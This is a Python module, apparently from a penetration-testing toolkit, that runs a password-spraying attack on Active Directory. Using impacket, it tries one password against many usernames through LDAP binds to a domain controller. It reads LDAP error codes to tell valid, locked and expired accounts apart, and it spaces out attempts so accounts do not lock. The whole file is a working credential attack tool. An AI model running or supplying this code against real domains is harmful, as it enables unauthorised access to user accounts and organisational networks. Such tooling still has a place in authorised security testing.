"""
Password Spraying — test a single password against many AD accounts.

Avoids account lockouts by spacing attempts and respecting lockout policy.
Uses impacket's LDAP and Kerberos/SMB authentication to validate credentials.
"""

import asyncio
import logging
from typing import Any

from impacket.examples import logger as impacket_logger
from impacket.ldap import ldap, ldapasn1

logging.getLogger("impacket").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)


def _make_search_base(domain: str) -> str:
    """Convert ``example.local`` → ``DC=example,DC=local``."""
    return "DC=" + ",DC=".join(domain.split("."))


async def ad_spray(
    domain: str,
    dc_ip: str,
    password: str,
    usernames: str = "",
    username_file: str = "",
    delay: int = 0,
    max_attempts: int = 0,
) -> dict:
    """Password spraying against Active Directory.

    Tests a single password against multiple user accounts, respecting
    lockout policy and spacing attempts to avoid triggering lockouts.

    Args:
        domain:        AD domain FQDN (e.g. ``"example.local"``).
        dc_ip:         IP address of a domain controller.
        password:      The password to spray across all users.
        usernames:     Comma-separated list of usernames to test.
        username_file: Path to a file with one username per line
                       (alternative to ``usernames``).
        delay:         Seconds to wait between attempts (default 0).
        max_attempts:  Maximum attempts before stopping (0 = unlimited).

    Returns:
        A dict with domain, dc_ip, results, valid_count, attempted_count,
        locked_accounts, and error fields.
    """
    result: dict[str, Any] = {
        "domain": domain,
        "dc_ip": dc_ip,
        "password": password,
        "results": [],
        "valid_count": 0,
        "attempted_count": 0,
        "locked_accounts": [],
        "error": None,
    }

    # ------------------------------------------------------------------
    # 1. Build user list
    # ------------------------------------------------------------------
    users: list[str] = []

    if usernames:
        users = [u.strip() for u in usernames.split(",") if u.strip()]
    elif username_file:
        try:
            with open(username_file) as f:
                users = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except Exception as exc:
            result["error"] = f"Failed to read username file: {exc}"
            return result
    else:
        result["error"] = "Either usernames or username_file must be provided."
        return result

    if not users:
        result["error"] = "No usernames to spray."
        return result

    # ------------------------------------------------------------------
    # 2. Spray each user
    # ------------------------------------------------------------------
    ldap_conn = None
    base_dn = _make_search_base(domain)

    for i, user in enumerate(users):
        if max_attempts > 0 and i >= max_attempts:
            break

        entry: dict[str, Any] = {
            "username": user,
            "valid": False,
            "locked": False,
            "error": None,
        }

        try:
            ldap_url = f"ldap://{dc_ip}"
            ldap_conn = ldap.LDAPConnection(ldap_url, base_dn)
            ldap_conn.login(user, password, domain, "", "", "")

            entry["valid"] = True
            result["valid_count"] += 1
            ldap_conn.close()

        except ldap.LDAPSessionError as exc:
            err_str = str(exc)
            if "account_expired" in err_str.lower() or "data 532" in err_str:
                entry["error"] = "Account expired"
            elif "invalid_credentials" in err_str.lower() or "data 525" in err_str:
                entry["error"] = "Invalid credentials"
            elif "account_locked" in err_str.lower() or "data 775" in err_str:
                entry["locked"] = True
                entry["error"] = "Account locked"
                result["locked_accounts"].append(user)
            elif "data 773" in err_str:
                entry["error"] = "Password must change"
            else:
                entry["error"] = err_str
        except Exception as exc:
            entry["error"] = str(exc)
        finally:
            if ldap_conn is not None:
                try:
                    ldap_conn.close()
                except Exception:
                    pass

        result["results"].append(entry)
        result["attempted_count"] += 1

        if delay > 0 and i < len(users) - 1:
            await asyncio.sleep(delay)

    return result
